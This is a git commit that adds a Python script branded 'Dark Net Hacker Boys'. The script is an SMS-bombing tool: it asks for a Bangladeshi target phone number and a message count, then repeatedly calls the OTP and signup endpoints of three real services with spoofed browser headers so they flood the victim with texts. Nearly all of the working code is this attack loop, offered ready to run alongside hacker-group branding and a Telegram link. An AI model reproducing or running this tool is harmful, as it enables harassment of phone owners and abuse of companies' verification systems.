5d3aab3467f318601750e506eb174fa93c5e5907
Sm sujoy <127983243+sujoy221133@users.noreply.github.com>
2023-12-28 15:38:12 +0600

    Add files via upload

---
+++ sujoy.sms.py
@@ -0,0 +1,154 @@
+import os
+print("\033[1;92m  {D-N-H  BOYS}SYSTEM INSTALL. . . . \033[1;30m")
+os.system("pkg install espeak")
+print("\033[1;92m   01701435225 (নগদ পারসোনাল নাম্বার) \033[1;30m")
+os.system('espeak -a 300 "Robot install complete"')
+print("\033[1;92m   UPDATE CHECKING BOSS D-N-H BOYS \033[1;30m")
+os.system('espeak -a 300 "Wellcome to dark net hacker boys"')
+os.system("git pull")
+import os,requests,time
+time.sleep(1)
+os.system("clear")
+os.system("xdg-open https://t.me/dnhboys1")
+#---------------sujoy  --------------#
+
+
+
+#---------------𝗪𝗔𝗦𝗜𝗠 𝗕𝗢𝗧 𝗦𝗢𝗨𝗡𝗗--------------#
+
+
+
+import os
+os.system("pkg install play-audio")
+try:
+#𝗪𝗔𝗦𝗜𝗠 𝗕𝗢𝗧 𝗦𝗢𝗨𝗡𝗗
+      import gtts
+except:
+        os.system("pip install gtts")
+        import gtts
+from gtts import gTTS
+#𝗪𝗔𝗦𝗜𝗠 𝗕𝗢𝗧 𝗦𝗢𝗨𝗡𝗗
+def create_(text,file):            #𝗪𝗔𝗦𝗜𝗠 𝗕𝗢𝗧 𝗦𝗢𝗨𝗡𝗗
+       my_a=gTTS(text)
+       my_a.save(file)
+
+
+def play_audio(audio_file):
+       os.system("play-audio "+audio_file)
+#𝗪𝗔𝗦𝗜𝗠 𝗕𝗢𝗧 𝗦𝗢𝗨𝗡𝗗
+def wasim(text,file):
+       create_(text,file)
+       play_audio(file)
+       
+ #---------------𝗪𝗔𝗦𝗜𝗠 𝗕𝗢𝗧 𝗦𝗢𝗨𝗡𝗗--------------#
+       
+       
+logo3=("""
+\033[38;5;46m███████╗\033[31;1m██╗   ██╗     \033[34;1m██╗ \033[37;1m██████╗ \033[33;1m██╗   ██╗
+\033[38;5;46m██╔════╝\033[31;1m██║   ██║     \033[34;1m██║\033[37;1m██╔═══██╗\033[33;1m╚██╗ ██╔╝
+\033[38;5;46m███████╗\033[31;1m██║   ██║     \033[34;1m██║\033[37;1m██║   ██║ \033[33;1m╚████╔╝ 
+\033[38;5;46m╚════██║\033[31;1m██║   ██║\033[34;1m██   ██║\033[37;1m██║   ██║  \033[33;1m╚██╔╝  
+\033[38;5;46m███████║\033[31;1m╚██████╔╝\033[34;1m╚█████╔╝\033[37;1m╚██████╔╝   \033[33;1m██║   
+\033[38;5;46m╚══════╝ \033[31;1m╚═════╝  \033[34;1m╚════╝  \033[37;1m╚═════╝    \033[33;1m╚═╝   
+
+    \033[38;5;46md8888b. d8b   db db   db 
+    \033[38;5;46m88  `8D 888o  88 88   88 
+    \033[38;5;46m88   88 88V8o 88 88ooo88 
+    \033[38;5;46m88   88 88 V8o88 88~~~88 
+    \033[38;5;46m88  .8D 88  V888 88   88 
+    \033[38;5;46mY8888D' VP   V8P YP   YP                                                       
+
+\x1b[38;5;196m\033[38;5;46m[D]\033[38;5;46m𝐀𝐔𝐓𝐇𝐎𝐑   \x1b[38;5;196m   \033[38;5;46mᴅɴ͢͢͢ʜ  \x1b[38;5;196m\033[38;5;46mASRAF MAHDI  \x1b[38;5;196m
+\x1b[38;5;196m\033[38;5;46m[N]\033[38;5;46m𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊  \x1b[38;5;196m  \033[38;5;46mᴅɴ͢͢͢ʜ\x1b[38;5;196m\033[38;5;46mDARK NET HACKER BOYS \x1b[38;5;196m
+\x1b[38;5;196m\033[38;5;46m[B]\033[38;5;46m𝐆𝐈𝐓𝐇𝐔𝐁    \x1b[38;5;196m  \033[38;5;46mᴅɴ͢͢͢ʜ \x1b[38;5;196m\033[38;5;46mD-N-H-BOYS1\x1b[38;5;196m
+\x1b[38;5;196m\033[38;5;46m[O]\033[38;5;46m𝐓𝐄𝐋𝐄𝐆𝐑𝐀𝐌  \x1b[38;5;196m  \033[38;5;46mᴅɴ͢͢͢ʜ \x1b[38;5;196m\033[38;5;46https://t.me/dnhboys1   \x1b[38;5;196m
+\x1b[38;5;196m\033[38;5;46m[S]\033[38;5;46m𝐅𝐑𝐎𝐌     \x1b[38;5;196m   \033[38;5;46mᴅɴ͢͢͢ʜ\x1b[38;5;196m \033[38;5;46m𝐁𝐀𝐍𝐆𝐋𝐀𝐃𝐄𝐒𝐇       \x1b[38;5;196m 
+\x1b[38;5;196m  \033[38;5;46mD-N-HBOYS \x1b[38;5;196m\033[00m\033[1;30m""")
+
+
+
+
+
+
+
+
+
+
+print(logo3)
+wasim("choice.your.target.number","I.mp3")
+num=input("""  \033[38;5;46mTARGET NUMBER : +880""")
+wasim("Sms amount","I.mp3")
+amount=int(input("\n  \033[38;5;46mSMS AMOUNT : "))
+wasim("Coba.samso","I.mp3")
+headers1={
+			  "authority":"www.bioscopelive.com",
+			  "method":"GET",
+			  "scheme":"https",
+			  "accept":"*/*",
+			  "accept-encoding":"gzip, deflate, br",
+			  "accept-language":"en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7",
+			  "if-none-match":'W/"5baf0d010507bc980255f9941283860a"',
+			  "referer":"https://www.bioscopelive.com/en/login?bongoId=QPj10yOQIwI",
+			  "save-data":"on",
+			  "sec-ch-ua":'"Chromium";v="107", "Not=A?Brand";v="24"',
+			  "sec-ch-ua-mobile":"?1",
+			  "sec-ch-ua-platform":'Android',
+			  "sec-fetch-dest":"empty",
+			  "sec-fetch-mode":"cors",
+			  "sec-fetch-site":"same-origin",
+			  "user-agent":"Mozilla/5.0 (Linux; Android 10; Z28) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
+			  "x-requested-with":"XMLHttpRequest"
+}
+url1="https://www.bioscopelive.com/en/login/send-otp?phone=880"+num+"&operator=bd-otp"
+headers2={
+         "referer":"https://bikroy.com/bn/users/login?action=login&stack=webapp&redirect-url=/bn/users/login-options",
+         "user-agent":"Mozilla/5.0 (Linux; Android 10; Z28) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
+}
+url2="https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=0"+num
+data={
+  "name": num,
+  "phoneNumber": num,
+  "service": "redx"
+}
+headers3={
+  "referer":"https://redx.com.bd/",
+  "user-agent":"Mozilla/5.0 (Linux; Android 10; Z28) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
+}
+ses=0
+while amount>ses:
+  sent1=requests.get(url1,headers=headers1)
+  if sent1.status_code==200:
+    ses+=1
+    print(f"\n{ses}  \033[38;5;46mᴅɴ͢͢͢ʜSMS WAS SENT☠️")
+  else:
+    pass
+  
+  sent2=requests.get(url2,headers=headers2)
+  if sent2.status_code==200:
+    ses+=1
+    print(f"\n{ses} \033[38;5;46mᴅɴ͢͢͢ʜSMS WAS SENT☠️")
+  else:
+    pass
+  
+  send3=requests.post("https://api.redx.com.bd/v1/user/signup",headers=headers3,data=data)
+  if send3.status_code==200:
+    ses+=1
+    print(f"\n{ses} \033[38;5;46mᴅɴ͢͢͢ʜSMS WAS SENT☠️")
+    
+  else:
+    pass
+os.system("clear")
+print(""" \033[1;32m
+\x1b[38;5;196m SEN☠️       
+  ____        _   _       _   _   ____   _____   ______   
+ |  _ \      | \ | |     | | | | | __ ) / _ \ \ / / ___|  
+ | | | |_____|  \| |_____| |_| | |  _ \| | | \ V /\___ \  
+ | |_| |_____| |\  |_____|  _  | | |_) | |_| || |  ___) | 
+ |____/      |_| \_|     |_| |_| |____/ \___/ |_| |____/                                                                                                                
+\x1b[38;5;196m \033[38;5;46mᴅɴ͢͢͢ʜ\x1b[38;5;196m
+\x1b[38;5;196m\033[38;5;46m[D]\033[38;5;46m𝐀𝐔𝐓𝐇𝐎𝐑   \x1b[38;5;196m \033[38;5;46mᴅɴ͢͢͢ʜ\x1b[38;5;196m\033[38;5;46mASRAF MAHDI \x1b[38;5;196m
+\x1b[38;5;196m\033[38;5;46m[N]\033[38;5;46m𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊  \x1b[38;5;196m  \033[38;5;46mᴅɴ͢͢͢ʜ\x1b[38;5;196m\033[38;5;46mdark.net.hacker.boys1\x1b[38;5;196m
+\x1b[38;5;196m\033[38;5;46m[B]\033[38;5;46m𝐆𝐈𝐓𝐇𝐔𝐁    \x1b[38;5;196m  \033[38;5;46mᴅɴ͢͢͢ʜ\x1b[38;5;196m\033[38;5;46mD-N-H-BOYS1 \x1b[38;5;196m
+\x1b[38;5;196m\033[38;5;46m[O]\033[38;5;46m𝐓𝐄𝐋𝐄𝐆𝐑𝐀𝐌  \x1b[38;5;196m \033[38;5;46mᴅɴ͢͢͢ʜ\x1b[38;5;196m\033[38;5;46mt.me/dnhboys1   \x1b[38;5;196m
+\x1b[38;5;196m\033[38;5;46m[S]\033[38;5;46m𝐅𝐑𝐎𝐌     \x1b[38;5;196m \033[38;5;46mᴅɴ͢͢͢ʜ\x1b[38;5;196m \033[38;5;46m𝐁𝐀𝐍𝐆𝐋𝐀𝐃𝐄𝐒𝐇       \x1b[38;5;196m 
+\x1b[38;5;196m \033[38;5;46mᴅɴ͢͢͢ʜ\x1b[38;5;196m\033[00m\033[1;30m""")
